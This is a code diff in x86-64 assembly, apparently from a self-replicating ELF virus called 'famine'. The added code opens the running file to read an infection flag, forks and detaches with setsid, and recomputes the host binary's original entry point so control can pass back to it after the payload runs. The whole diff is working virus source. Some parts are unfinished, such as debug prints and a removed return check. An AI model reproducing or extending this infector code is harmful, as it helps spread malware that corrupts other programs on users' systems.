@@ -10,6 +10,52 @@ section .text
 
 _start:
 	PUSH_ALL
+	mov		rax, SYS_open
+	lea		rdi, [rel self]
+	xor		rsi, rsi
+	xor		rdx, rdx
+	syscall
+	cmp		rax, 0
+
+	jle		.just_quit
+	mov		r12, rax
+
+	mov		rax, SYS_pread64
+	mov		rdi, r12
+	lea		rsi, [rel zero]
+	mov		rdx, 1
+	mov		r10, 10
+	syscall
+
+	.just_quit:
+	mov		rax, SYS_close
+	mov		rdi, r12
+	syscall
+	POP_ALL
+	mov		al, BYTE [rel zero]	; SI ICI = 0, ca signfiie c'est famine
+	test	al, al
+	jz		.continue
+
+	mov		rax, SYS_fork
+	syscall
+	cmp		rax, 0
+	jna		.continue_fork
+
+	mov		rax, [rel entry]
+	mov		[rel new_entry], rax
+	mov		rax, [rel new_entry]
+	sub		rax, [rel old_entry]
+	lea		rdi, [rel _start]
+	sub		rdi, rax
+	mov		[rel new_entry], rdi
+
+	jmp		[rel new_entry]
+
+.continue_fork:
+	mov		rax, SYS_setsid
+	syscall
+.continue:
+	PUSH_ALL
 	jmp		end_
 
 print_rax:
@@ -418,7 +464,6 @@ print_rax:
 
 
 		cmp		r13, 1
-		je		.return
 		mov		rax, [rel p_vaddr]
 		;add		rax, [rel elfb + ehdr.e_shoff]
 		;add		rax, r15	-> Tant que ca crash pas on add pas!
@@ -719,15 +764,6 @@ print_rax:
 	ret
 
 end_:
-	mov		rax, [rel entry]
-	mov		[rel new_entry], rax
-
-	mov		rax, [rel new_entry]
-	sub		rax, [rel old_entry]
-	lea		rdi, [rel _start]
-	sub		rdi, rax
-
-	mov		[rel new_entry], rdi
 
 	call	famine
 
@@ -736,6 +772,7 @@ end_:
 	xor		rsi, rsi
 	xor		rdx, rdx
 	syscall
+
 	cmp		rax, 0
 	jle		.just_quit
 	mov		r12, rax
@@ -752,15 +789,16 @@ end_:
 	mov		rdi, r12
 	syscall
 
+
 	.just_quit:
 		POP_ALL
 		mov		al, BYTE [rel zero]
 		test	al, al
 		jz		.exit_ret
 
+		mov		rax, 15
+		call	print_rax
 
-
-		jmp		[rel new_entry]
 
 	.exit_ret:
 
